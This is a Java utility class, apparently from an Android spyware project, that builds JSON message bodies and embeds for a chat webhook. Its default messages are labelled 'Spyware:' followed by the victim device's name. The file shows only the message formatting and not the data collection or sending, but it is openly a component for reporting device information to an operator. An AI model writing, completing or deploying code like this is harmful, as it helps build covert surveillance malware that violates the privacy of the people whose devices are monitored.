package com.gptinteractive.rabbit.utils;

import com.gptinteractive.rabbit.api.DeviceInfo;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class WebhookUtils {

    public static String buildBody(JSONArray embeds, String content, String userName) throws JSONException {
        JSONObject body = new JSONObject();

        body.put("wait", true);
        body.put("content", content);
        body.put("username", userName);
        body.put("avatar_url", "https://raw.githubusercontent.com/GatoArtStudios/kailand/web/public/favicon.png");

        if (embeds instanceof JSONArray) {
            body.put("embeds", embeds);
        }
        return body.toString(4);
    }
    public static String buildBody(JSONArray embeds) throws JSONException {
        String deviceName = DeviceInfo.getDeviceName();
        return buildBody(embeds, "`" + deviceName + "`", "Spyware: " + deviceName);
    }
    public static String buildBody(JSONArray embeds, String content) throws JSONException {
        String deviceName = DeviceInfo.getDeviceName();
        return buildBody(embeds, content, "Spyware: " + deviceName);
    }
    public static String buildBody() throws JSONException {
        String deviceName = DeviceInfo.getDeviceName();
        return buildBody(new JSONArray(), deviceName, "Spyware: " + deviceName);
    }

    public static JSONObject buildEmbed(String title, String description, int color, String type) throws JSONException {
        JSONObject embed = new JSONObject();
        embed.put("title", title);
        embed.put("description", description);
        embed.put("color", color);
        embed.put("type", type);
        return embed;
    }
    public static JSONObject buildEmbed(String title, String description, int color) throws JSONException {
        return buildEmbed(title, description, color, "rich");  // Valor por defecto de "type"
    }

    public static JSONObject buildEmbed(String title, String description) throws JSONException {
        return buildEmbed(title, description, 15548997);  // Valor por defecto de "color"
    }

    public static JSONObject buildEmbed(String title) throws JSONException {
        return buildEmbed(title, "null");  // Valor por defecto de "description"
    }

    public static JSONObject buildEmbed() throws JSONException {
        return buildEmbed("null");  // Valor por defecto de "title"
    }

}
